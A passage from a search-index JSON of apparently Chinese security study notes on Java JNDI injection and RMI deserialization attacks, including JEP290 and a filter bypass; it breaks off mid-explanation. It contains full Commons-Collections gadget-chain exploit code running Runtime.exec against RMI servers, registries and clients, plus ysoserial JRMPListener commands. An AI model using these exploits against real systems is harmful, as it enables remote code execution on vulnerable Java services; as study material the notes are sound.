\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u4e00\u4e2a\u672c\u5730\u7c7b\uff0c\u5176\u5fc5\u987b\u5b9e\u73b0javax.naming.spi.ObjectFactory\u63a5\u53e3,\u56e0\u4e3a\u5728javax.naming.spi.NamingManager#getObjectFactoryFromReference\u6700\u540e\u7684return\u8bed\u53e5\u5bf9Factory\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362 \u5e76\u4e14\u8be5\u5de5\u5382\u7c7b\u81f3\u5c11\u5b58\u5728\u4e00\u4e2agetObjectInstance()\u65b9\u6cd5 \uff08\u53ef\u4ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u4ee3\u7801\u7684\uff09","title":"\u5229\u7528\u672c\u5730\u7c7b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#tomcat8","text":"tomcat8\u6709\u4e00\u4e2a\u7c7borg.apache.naming.factory.BeanFactory\uff0c\u5176\u5b9e\u73b0\u4e86ObjectFactory\u63a5\u53e3\u4e14\u6709getObjectInstance\u65b9\u6cd5\uff0c\u66f4\u91cd\u8981\u7684\u662f\u5176getObjectInstance\u53ef\u4ee5\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002 \u5b83\u4f1a\u5148\u83b7\u53d6ref\u5bf9\u8c61\u4e2d\u7684resourceclass","title":"TOMCAT8"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#groovy","text":"","title":"Groovy"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/#ldap","text":"","title":"ldap\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/RMI%20ATTACK/RMI%20ATTACK/","text":"RMI ATTACK \u76ee\u5f55 RMI \u53cd\u5e8f\u5217\u5316\u653b\u51fb \u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u7aef \u6ce8\u518c\u7aef\u653b\u51fb\u670d\u52a1\u7aef \u670d\u52a1\u7aef\u653b\u51fb\u5ba2\u6237\u7aef \u5ba2\u6237\u7aef\u653b\u51fb\u670d\u52a1\u7aef \u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u7aef \u6ce8\u518c\u7aef\u653b\u51fb\u5ba2\u6237\u7aef JEP290 \u4ee3\u7801\u5206\u6790 JEP290 BYPASS UnicastRef\uff08JDK<=8u231\uff09 LiveRef RemoteObjectInvocationHandler \u5b8c\u6574\u590d\u73b0 \u4eff\u5199lookup\u5b9e\u73b0 \u603b\u7ed3 \u5f15\u7528\u81ealala\u5e08\u5085 RMI \u53cd\u5e8f\u5217\u5316\u653b\u51fb RMI\u8c03\u7528\u7531\u4e09\u90e8\u5206\u6784\u6210\uff1a\u670d\u52a1\u7aef\uff0c\u5ba2\u6237\u7aef\uff0c\u6ce8\u518c\u7aef\u3002\u800c\u5728RMI\u4f20\u8f93\u6570\u636e\u65f6\uff0c\u6570\u636e\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u8fdb\u884c\u4f20\u8f93\u7684\uff0c\u8fd9\u5c31\u610f\u5473\u7740RMI\u8c03\u7528\u4e2d\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u7684\u64cd\u4f5c\uff0c\u8fd9\u5c31\u7ed9\u4e86\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u53ef\u4e58\u4e4b\u673a\u3002 \u5728\u9ad8\u7248\u672cJDK\u4e2d\uff0c\u6ce8\u518c\u7aef\u548c\u670d\u52a1\u7aef\u662f\u5fc5\u987b\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u7684\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5728\u9ad8\u7248\u672cJDK\u4e2d\u6ce8\u518c\u7aef\u6253\u670d\u52a1\u7aef\u6216\u8005\u670d\u52a1\u7aef\u6253\u653b\u51fb\u7aef\u6ca1\u5565\u7528\u3002\u800c\u5728\u4f4e\u7248\u672c\u4e2d\u8fd9\u4e24\u8005\u662f\u53ef\u4ee5\u5206\u79bb\u7684\uff0c\u8fd8\u7b97\u6709\u653b\u51fb\u7684\u53ef\u80fd\u3002\u4f46\u603b\u4f53\u6765\u8bf4\u8fd9\u7c7b\u653b\u51fb\u65b9\u6cd5\u8fd8\u662f\u5f88\u9e21\u808b\u7684\u3002 \u63a5\u4e0b\u6765\u4f1a\u5bf9\u653b\u51fb\u65b9\u548c\u53d7\u5bb3\u65b9\u7684\u4e0d\u540c\uff0c\u5206\u62106\u79cd\u653b\u51fb\u65b9\u5f0f\uff0c\u5982\u4e0b\u3002 \uff08\u9664\u975e\u7279\u6b8a\u8bf4\u660e\uff0c\u5426\u5219\u4e0b\u9762\u8bf4\u7684\u90fd\u662f8u66\u548cCC1\u94fe\uff09 \u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u7aef \u670d\u52a1\u7aef\u5728\u5411\u6ce8\u518c\u7aef\u4f7f\u7528bind\u7b49\u51fd\u6570\u64cd\u4f5c\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u4f1a\u63d0\u4f9b\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6ce8\u518c\u7aef\u83b7\u53d6\u5230\u5e8f\u5217\u5316\u6570\u636e\u540e\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u8fd9\u4e2d\u95f4\u5c31\u4f1a\u6709\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u751f\u53ef\u80fd\u3002 \u4e0b\u9762\u7528CC1\u94fe\u53bb\u8fdb\u884c\u653b\u51fb\uff0cJDK\u7248\u672c8u66 import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; public class server { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[] {\"calc\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"123\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject)); Registry registry = LocateRegistry.createRegistry(3333); Registry registry_remote = LocateRegistry.getRegistry(\"127.0.0.1\", 3333); registry_remote.bind(\"HelloRegistry\", proxyEvalObject); } } \u6ce8\u518c\u7aef\u653b\u51fb\u670d\u52a1\u7aef \u670d\u52a1\u7aef\u5728\u5411\u6ce8\u518c\u7aef\u4f7f\u7528bind\u7b49\u51fd\u6570\u64cd\u4f5c\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u4f1a\u63d0\u4f9b\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u968f\u540e\u6ce8\u518c\u7aef\u4e5f\u4f1a\u5411\u670d\u52a1\u7aef\u53d1\u9001\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u670d\u52a1\u7aef\u4fbf\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u5176\u4e2d\u4fbf\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53d1\u751f\u7684\u53ef\u80fd\u3002 8u66 import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:1234/setUser\"; user user = new userImpl(); LocateRegistry.createRegistry(12345); Naming.unbind(url); System.out.println(\"Server Running At\uff1a\" + url); } } \u540c\u65f6ysoserial\u5f00\u542f\u6076\u610fJRMP\u6ce8\u518c\u7aef\uff0c\u63d0\u4f9bcc1\u94fe\u3002 java -cp .\\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections1 \"calc\" \u670d\u52a1\u7aef\u653b\u51fb\u5ba2\u6237\u7aef RMI\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4ea4\u4e92\u4e5f\u662f\u7531\u5e8f\u5217\u5316\u6570\u636e\u4f20\u8f93\u6765\u8fdb\u884c\u7684\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u4e4b\u95f4\u4e5f\u5b58\u5728\u76f8\u4e92\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u53ef\u80fd\u3002 \u670d\u52a1\u7aef import java.lang.reflect.InvocationHandler; import java.rmi.Remote; public interface user extends Remote{ public InvocationHandler exp() throws Exception; } import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class userImpl extends UnicastRemoteObject implements user{ //\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u5b9e\u73b0\u7c7b,\u6ce8\u610f\u8fd9\u4e2a\u8fdc\u7a0b\u5b9e\u73b0\u7c7b\u5fc5\u987b\u7ee7\u627f\u81eaUnicastRemoteObject,\u4e0d\u7136\u670d\u52a1\u7aef\u4e0d\u4f1a\u53d1\u9001\u8be5\u7c7b\u7684\u5bf9\u8c61\u7684\u5b58\u6839(stub(\u4e0b\u6587\u8bb2)) protected userImpl RemoteException; protected userImpl() throws RemoteException { } public InvocationHandler exp() throws Exception{ ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); //\u5999\u5904 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//\u83b7\u5f97\u4e00\u4e2aAnnotationInvocationHandler\u5bf9\u8c61 Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//\u521b\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u4ee3\u7406\u65b9\u6cd5\u4e3aAnnotationInvocationHandler\u5bf9\u8c61\u91cc\u7684invoke\u65b9\u6cd5 InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); //\u5c06\u4ee3\u7406Map\u4f20\u5165\uff0c\u5f53\u4ee3\u7406Map\u88ab\u6267\u884c\u4efb\u4e00\u65b9\u6cd5\u65f6\uff0c\u6267\u884cinvoke\u65b9\u6cd5 return handler1; } } import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = new userImpl(); LocateRegistry.createRegistry(23335); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); } } \u5ba2\u6237\u7aef import java.lang.reflect.InvocationHandler; import java.rmi.Remote; public interface user extends Remote{ public InvocationHandler exp() throws Exception; } import java.rmi.Naming; public class client { public static void main(String[] args){ try{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = (user)Naming.lookup(url); Object ob = user.exp(); System.out.println(ob); }catch(Exception e){ e.printStackTrace(); } } } \u5148\u542f\u52a8\u670d\u52a1\u7aef\u518d\u542f\u52a8\u5ba2\u6237\u7aef\u5c31\u80fd\u5f39\u8ba1\u7b97\u5668\u8fa3 \u5ba2\u6237\u7aef\u653b\u51fb\u670d\u52a1\u7aef \u539f\u7406\u540c\u4e0a\uff0c\u4e0d\u518d\u8bf4\u4e86\u3002 \u670d\u52a1\u7aef import java.lang.reflect.InvocationHandler; import java.rmi.Remote; public interface user extends Remote{ public void exp(Object a) throws Exception; } import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class userImpl extends UnicastRemoteObject implements user{ //\u5b9a\u4e49\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u5b9e\u73b0\u7c7b,\u6ce8\u610f\u8fd9\u4e2a\u8fdc\u7a0b\u5b9e\u73b0\u7c7b\u5fc5\u987b\u7ee7\u627f\u81eaUnicastRemoteObject,\u4e0d\u7136\u670d\u52a1\u7aef\u4e0d\u4f1a\u53d1\u9001\u8be5\u7c7b\u7684\u5bf9\u8c61\u7684\u5b58\u6839(stub(\u4e0b\u6587\u8bb2)) protected userImpl RemoteException; protected userImpl() throws RemoteException { } public void exp(Object a) throws Exception{ System.out.println(\"123\"); } } import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class server { public static void main(String[] args) throws Exception{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = new userImpl(); LocateRegistry.createRegistry(23335); Naming.bind(url,user); System.out.println(\"Server Running At\uff1a\" + url); } } \u5ba2\u6237\u7aef import java.rmi.Remote; public interface user extends Remote{ public void exp(Object a) throws Exception; } import java.rmi.Naming; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class client { public static void main(String[] args){ try{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = (user)Naming.lookup(url); ChainedTransformer chainedTransformer= new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); //\u5999\u5904 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//\u83b7\u5f97\u4e00\u4e2aAnnotationInvocationHandler\u5bf9\u8c61 Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//\u521b\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u4ee3\u7406\u65b9\u6cd5\u4e3aAnnotationInvocationHandler\u5bf9\u8c61\u91cc\u7684invoke\u65b9\u6cd5 InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); user.exp(handler1); }catch(Exception e){ e.printStackTrace(); } } } \u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u7aef \u5728\u5ba2\u6237\u7aef\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u67e5\u8be2\u8bf7\u6c42\u65f6\uff0c\u4f1a\u4f7f\u7528\u5230lookup\u51fd\u6570\u3002 \u6211\u4eec\u5bf9lookup\u51fd\u6570\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u8ddf\u8fdb\uff0c\u4f1a\u6765\u5230\u8fd9\u4e2a\u5730\u65b9\u3002 \u53ef\u4ee5\u6e05\u6670\u5730\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u5e8f\u5217\u5316\u65b9\u6cd5writeObject\uff0c\u5176\u4e2dvar1\u4fbf\u662flookup\u65b9\u6cd5\u4e2d\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u3002var1\u5728\u8fdb\u884c\u5e8f\u5217\u5316\u540e\u4f1a\u5728\u540e\u9762\u7684ref.invoke(var2)\u5904\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u4f1a\u53cd\u5e8f\u5217\u5316\u8fd9\u6bb5\u6570\u636e\uff0c\u7ed9\u4e86\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u4ea7\u751f\u7684\u673a\u4f1a\uff1a\u6211\u4eec\u53ef\u4ee5\u4eff\u5199\u4e00\u4e2alookup\u65b9\u6cd5\uff0c\u7ed9var1\u8d4b\u503c\u4e3a\u6076\u610f\u6570\u636e\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u9020\u6210\u653b\u51fb\u3002 \u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u662f\u6211\u5728\u5148\u77e5\u4e0a\u5ad6\u7684\u3002 https://xz.aliyun.com/t/8706#toc-9 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import sun.rmi.server.UnicastRef; import java.io.ObjectOutput; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.Operation; import java.rmi.server.RemoteCall; import java.rmi.server.RemoteObject; import java.util.HashMap; import java.util.Map; public class client { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[] {\"calc\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"Threezh1\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject)); Registry registry_remote = LocateRegistry.getRegistry(\"127.0.0.1\", 23335); // \u83b7\u53d6super.ref Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote); // \u83b7\u53d6operations Field[] fields_1 = registry_remote.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry_remote); // \u8ddflookup\u65b9\u6cd5\u4e00\u6837\u7684\u4f20\u503c\u8fc7\u7a0b RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(proxyEvalObject); ref.invoke(var2); registry_remote.lookup(\"HelloRegistry\"); System.out.println(\"rmi start at 3333\"); } } \u6ce8\u518c\u7aef\u653b\u51fb\u5ba2\u6237\u7aef \u5ba2\u6237\u7aef\u5411\u6ce8\u518c\u7aef\u8c03\u7528list\uff0clookup\u7b49\u51fd\u6570\u67e5\u8be2\u670d\u52a1\u540e\uff0c\u6ce8\u518c\u7aef\u4f1a\u8fd4\u56de\u67e5\u8be2\u7ed3\u679c\u7684\u5e8f\u5217\u5316\u5f62\u5f0f\u7ed9\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u540e\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u8fd9\u5c31\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u53ef\u80fd\uff0c public class client { public static void main(String[] args){ try{ String url = \"rmi://127.0.0.1:23335/exp\"; user user = (user)Naming.lookup(url); }catch(Exception e){ e.printStackTrace(); } } } ysoserial\u5f00\u542f\u6076\u610f\u6ce8\u518c\u7aef java -cp .\\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 23335 CommonsCollections1 \"calc\" JEP290 \u5728JDK8u121\uff0cJDK7u13\uff0cJDK6u141\u4e4b\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u673a\u5236JEP-290 \u5728JDK8u121\uff0cJDK7u13\uff0cJDK6u141\u4e4b\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u673a\u5236JEP-290\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u63a5\u53e3 ObjectInputFilter \uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u6765\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u65f6\u4f9d\u7167\u767d\u540d\u5355\u5b9e\u73b0\u7c7b\u7684\u8fc7\u6ee4\u3002 RMI\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u6709\u8fc7\u6ee4\u5668\uff0c RegistryImpl#registryFilter \u53ef\u4ee5\u53d1\u73b0\u767d\u540d\u5355\u7c7b\u6709\u8fd9\u4e9b String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID \u53ea\u8981\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u7c7b\u4e0d\u662f\u4e0a\u8ff0\u7c7b\uff0c\u5c31\u4f1a\u629b\u51faREJECTED\u5f02\u5e38 \u4e0b\u9762\u662f\u6211\u57288u181 \u53d1\u8d77\u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u7aef\u65f6\u629b\u51fa\u7684REJECTED\u5f02\u5e38\u3002 \u4ee3\u7801\u5206\u6790 RMI\u7684\u8fc7\u6ee4\u5668\u662f\u5982\u4f55\u53d1\u6325\u4f5c\u7528\u7684\u5462\uff1f\u5e26\u7740\u8fd9\u4e2a\u7591\u95ee\uff0c\u6211\u4eec\u53bb\u8c03\u8bd5\u4e00\u4e0b\u4ee3\u7801\u3002 \u5047\u8bbe\u6b64\u65f6\u5ba2\u6237\u7aef\u4eff\u5199lookup\u65b9\u6cd5\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6216\u8005\u670d\u52a1\u7aef\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u4e86\u4e00\u4e2abind/rebind\u8bf7\u6c42\uff0c\u6ce8\u518c\u7aef\u4fbf\u4f1a\u8c03\u7528UnicastServerRef\u6765\u5904\u7406\u8bf7\u6c42\u3002 \u8ddf\u8fdb\u8fd9\u4e2aUnicastServerRef#oldDispatch\u65b9\u6cd5\uff1a \u5728oldDispatch\u5012\u6570\u7b2c\u4e8c\u6392\u4ee3\u7801\uff0c\u8c03\u7528\u4e86UnicastServerRef#unmarshalCustomCallData\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u4e00\u4e0b \u53ef\u4ee5\u770b\u89c1\u8be5\u65b9\u6cd5\u4f7f\u7528\u4e86setObjectInputFilter\u65b9\u6cd5\uff0c\u800c\u8fd9\u4e2a\u65b9\u6cd5\u662f\u7528\u4f5c\u4e8e\u7ed9\u5e8f\u5217\u5316\u6570\u636e\u589e\u52a0\u8fc7\u6ee4\u5668\u7684 \u8fd9\u91cc\u4fbf\u662f\u4e3a\u5f53\u524d\u5e8f\u5217\u5316\u6d41\u589e\u52a0\u4e86UnicastServerRef.this.filter\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u3002 \ud83d\udccc\u90a3\u4e48UnicastServerRef.this.filter\u8fd9\u4e2a\u503c\u53c8\u662f\u54ea\u91cc\u6765\u7684\u5462\uff1f \u7b54\u6848\u662f\u5728\u8c03\u7528getRegistry\u65f6UnicastServerRef\u4fbf\u88ab\u521d\u59cb\u5316\u4e86\uff0c\u5176filter\u503c\u4e5f\u88ab\u8fdb\u884c\u4e86\u8d4b\u503c(Naming.bind \u4f1a\u81ea\u52a8\u8c03\u7528 LocateRegistry.getRegistry)\u3002 \u5982\u4e0b\u56fe\u4fbf\u662f\u8ddf\u8fdbLocateRegistry.getRegistry\u65b9\u6cd5\u540e\u7684\u4ee3\u7801\uff0c\u6b64\u5904\u5b9e\u4f8b\u5316\u4e86\u4e00\u4e2aUnicastServerRef\u5bf9\u8c61\u3002 \u6240\u4ee5UnicastServerRef.this.filter\u7684\u503c\u4fbf\u662fRegistryImpl#registryFilter \u5728\u8c03\u7528unmarshalCustomCallData\u8bbe\u7f6e\u597d\u5f53\u524d\u5e8f\u5217\u5316\u6d41\u7684\u8fc7\u6ee4\u5668\u540e\uff0c\u7a0b\u5e8f\u518d\u5f00\u59cb\u8c03\u7528RegistryImpl_Skel#dispatch\u6765\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c \u5728readObject\u65b9\u6cd5\u4e2d\u4f1a\u5224\u65ad\u5f53\u524d\u5e8f\u5217\u5316\u6d41\u662f\u5426\u914d\u7f6e\u6709\u8fc7\u6ee4\u5668\uff0c\u5982\u679c\u6709\u8fc7\u6ee4\u5668\u5c31\u5728\u4e0b\u9762\u7528checkInput\u5bf9\u5e8f\u5217\u5316\u6d41\u8fdb\u884c\u8fc7\u6ee4\u3002\u800ccheckInput\u5b9e\u8d28\u662f\u662f\u8c03\u7528\u5e8f\u5217\u5316\u6d41\u7684\u8fc7\u6ee4\u5668\u6765\u8fdb\u884c\u8fc7\u6ee4 \u4e0b\u56fe\u662f\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u8fc7\u6ee4\u7684\u6808\u5e27\u3002 JEP290 BYPASS UnicastRef\uff08JDK<=8u231\uff09 RegistryImpl_stub\u8fc7\u6ee4\u4e2d\u7684\u767d\u540d\u5355\u7c7b\u4e2d\u6709UnicastRef \u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u4e2a\u7c7b\u4e0a\u4e0b\u6587\u7ae0\u7ed5\u8fc7JEP290. \u8fd9\u91cc\u5148\u6765\u628a\u8be5\u653b\u51fb\u65b9\u6cd5\u7684\u5927\u81f4\u8f6e\u5ed3\u52fe\u52d2\u51fa\u6765\uff0c\u65b9\u4fbf\u9605\u8bfb\u4e0b\u9762\u7684\u5185\u5bb9\uff1a \u9996\u5148\u6211\u4eec\u5411\u6ce8\u518c\u7aef\u53d1\u9001\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61 \u8be5\u5bf9\u8c61\u80fd\u5728\u88ab\u53cd\u5e8f\u5217\u5316\u65f6\u4e3b\u52a8\u5411\u4e00\u4e2a\u6076\u610f\u6ce8\u518c\u7aef\u53d1\u8d77\u901a\u8baf\u5e76\u53cd\u5e8f\u5217\u5316\u5176\u4f20\u9001\u8fc7\u6765\u7684\u5185\u5bb9\uff0c\u6b64\u8fc7\u7a0b\u7684\u53cd\u5e8f\u5217\u5316\u6ca1\u6709\u7ecf\u8fc7Filter\u68c0\u9a8c 